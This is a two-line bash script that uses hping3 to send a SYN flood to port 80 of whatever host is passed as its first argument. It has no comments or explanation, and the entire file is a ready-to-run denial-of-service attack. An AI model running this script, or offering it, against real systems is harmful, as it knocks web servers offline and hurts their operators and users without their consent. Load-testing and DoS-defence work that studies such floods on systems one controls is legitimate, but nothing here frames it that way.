#!/bin/bash
hping3 -S --flood -V "$1" -p 80
